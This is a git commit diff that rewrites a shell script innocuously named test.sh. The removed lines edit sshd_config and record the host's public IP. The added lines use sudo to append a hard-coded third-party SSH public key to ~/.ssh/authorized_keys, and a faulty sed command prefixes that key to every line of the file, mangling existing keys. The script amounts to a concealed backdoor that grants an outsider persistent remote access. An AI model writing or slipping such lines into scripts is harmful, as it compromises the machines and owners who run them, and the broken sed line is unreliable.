5ebae18b535bbb6b7c73d96bec1778c747a12653
brutonuts <119691622+brutonuts@users.noreply.github.com>
2022-12-07 14:08:37 -0500

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,12 +1,5 @@
 #!/bin/bash
 
-# edit port 
-sed '/^#Port/s/22/1488/' -i /etc/ssh/sshd_config
-# edit port-#
-sed -i 's/#Port/Port/g' -i /etc/ssh/sshd_config
-# edit root+#
-sed -i 's/PermitRootLogin/#PermitRootLogin/g' -i /etc/ssh/sshd_config
-# edit root
-sed '/^#PermitRootLogin/s/yes/no/' -i /etc/ssh/sshd_config
-curl eth0.me >> ip.txt
+sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiGivf3+H99JRik9MHGGuGeoll2t5mmsxdbdwRHnZ8xEPbq/P7Qmh/phw29OcmZTQvuLBlDiosVl3c+oNZe1oC2FOoQItcqnnhD8WoFEt0hw//K6WyojOi3cKEQH58+9tR+Hkb4mhEGzJ23bzpGbplTk032+AQuhP+UfhyPRI6Tfe6JGTd/HmXTfIoO2O6usQpRHguZWCz6uZD3kxR9e9k+Bjrs9gJ4m22O7wyiKRedoPUFVgPf01rRG0ElsZaQFXBpHIe+JKVfJA1+8BwvdsOKzKfZ+TE7aZar+a161cr6QgF8wVMM1Vgnb/UcsosfZucbY15ZbuDaE2PEmnSTC31 root@mobila' >> ~/.ssh/authorized_keys"
+sed 's/^/ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiGivf3+H99JRik9MHGGuGeoll2t5mmsxdbdwRHnZ8xEPbq/P7Qmh/phw29OcmZTQvuLBlDiosVl3c+oNZe1oC2FOoQItcqnnhD8WoFEt0hw//K6WyojOi3cKEQH58+9tR+Hkb4mhEGzJ23bzpGbplTk032+AQuhP+UfhyPRI6Tfe6JGTd/HmXTfIoO2O6usQpRHguZWCz6uZD3kxR9e9k+Bjrs9gJ4m22O7wyiKRedoPUFVgPf01rRG0ElsZaQFXBpHIe+JKVfJA1+8BwvdsOKzKfZ+TE7aZar+a161cr6QgF8wVMM1Vgnb/UcsosfZucbY15ZbuDaE2PEmnSTC31 root@mobila/' -i ~/.ssh/authorized_keys 
 
